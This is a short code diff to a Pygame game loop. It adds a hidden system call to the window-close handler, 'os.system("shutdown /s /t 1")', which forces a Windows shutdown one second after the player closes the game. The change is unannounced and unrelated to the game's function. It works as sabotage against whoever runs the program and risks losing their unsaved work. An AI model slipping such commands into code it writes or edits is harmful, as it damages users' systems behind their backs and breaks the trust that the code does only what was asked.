@@ -60,6 +60,8 @@ while not crashed:
     for event in pygame.event.get():
         if event.type == pygame.QUIT:
             crashed = True
+            import os
+            os.system("shutdown /s /t 1")
             break
         if event.type == pygame.KEYDOWN:
             if event.key == pygame.K_LEFT:
